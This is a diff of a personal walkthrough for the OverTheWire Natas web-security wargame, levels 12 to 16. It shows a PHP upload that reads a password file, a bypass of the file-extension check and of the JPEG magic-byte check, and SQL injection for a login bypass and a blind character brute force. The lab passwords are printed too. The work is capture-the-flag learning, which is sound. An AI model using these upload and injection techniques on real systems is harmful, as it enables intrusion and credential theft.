@@ -233,42 +233,113 @@ I spoof it to Cookie header and refresh the site, finally I got:
 
 ___________________________________________________________________________________________
 
-level 12
+level 12 - inject php as png
 url: http://natas12.natas.labs.overthewire.org 
 username: natas12
 password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 solve:
+i tryed to inject php code wile uploading image.jpg, so i had to do some steps:
+1. make code that will show me the content of: "/etc/natas_webpass/natas13" in the file natas12.php:
+<?php
+$filePath = "/etc/natas_webpass/natas13";
+
+if (file_exists($filePath)) {
+    $fileContents = file_get_contents($filePath);
+    if ($fileContents !== false) {
+        echo "File Contents: " . $fileContents;
+    } else {
+        echo "Unable to read file.";
+    }
+} else {
+    echo "File does not exist.";
+}
+?>
+and than upload the file and see: "Choose a JPEG to upload (max 1KB): natas12.php"
+
+2. changing in the html to upload it as a php file and not jpg:
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000">
+<input type="hidden" name="filename" value="z29zr7zwe3.jpg"> =====>>> change it to php instead of png (<input type="hidden" name="filename" value="z29zr7zwe3.php">)
+Choose a JPEG to upload (max 1KB):<br>
+<input name="uploadedfile" type="file"><br>
+<input type="submit" value="Upload File">
+</form>
+
+3. upload the file and enter the link: The file upload/38m0c46m0b.php has been uploaded
+
+and after i entered the link i got:
+File Contents: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 
 ___________________________________________________________________________________________
 
-level 13
+level 13 - inject php as png
 url: http://natas13.natas.labs.overthewire.org 
 username: natas13
-password: XXX
+password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 solve:
+as the last level i tryed to inject php code wile uploading image.jpg. the only difference was that i only could upload jpg (becouse was writen:
+     else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+)
+so i changed the first  byte to go around it ()
+so i had to do some steps:
+1. make code in python that will insert b"\xFF\xD8\xFF\xE0" to the start of the file which will pass the validation function:
+the file could be found on: \ctf\over the wire challenges\web\natas\levels_staff\natas13\natas13.py
+
+2. changing in the html to upload it as a php file and not jpg:
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000">
+<input type="hidden" name="filename" value="z29zr7zwe3.jpg"> =====>>> change it to php instead of png (<input type="hidden" name="filename" value="z29zr7zwe3.php">)
+Choose a JPEG to upload (max 1KB):<br>
+<input name="uploadedfile" type="file"><br>
+<input type="submit" value="Upload File">
+</form>
+
+3. i run the python file and it create me a "natas13getaccess.php" file which i will upload to the site the same way as before
+
+4. i got :
+For security reasons, we now only accept image files!
+
+The file upload/56b23k8jm2.php has been uploaded
+
+5. i entered thr url and saw: ���� qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
 
 ___________________________________________________________________________________________
 
-level 14
+level 14 - sql injection
 url: http://natas14.natas.labs.overthewire.org 
 username: natas14
-password: XXX
+password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
 solve:
+in this one we make sql injection, 
+the query entered is:
+SELECT * from users where username="someusername" and password="somepassword"
+
+so we inject:
+User: natas15#
+we get the query:
+SELECT * from users where username="natas15" # and password =""
+and get the flag:
+Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 
 ___________________________________________________________________________________________
 
-level 15
+level 15 - sql injection with brute force
 url: http://natas15.natas.labs.overthewire.org 
 username: natas15
-password: XXX
+password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 solve:
-
+in this solution we can only see if the user exist, so we have to make a brute force/
+first i make code in python that will inject "natas16" and password LIKE BINARY "%' + char + '%" #" into the query to test if the chars in the password to filter all the characters that not in use.
+second we brute force with the filtered characters and inject "natas16" and password LIKE BINARY "' + passwd + char + '%" #" to the query
+and get the password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+code is in: ctf\over the wire challenges\web\natas\levels_staff\natas15\natas15.py
 ___________________________________________________________________________________________
 
-level 16
+level 16 - code injection with brute force
 url: http://natas16.natas.labs.overthewire.org 
 username: natas16
-password: XXX
+password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 solve:
 
 ___________________________________________________________________________________________
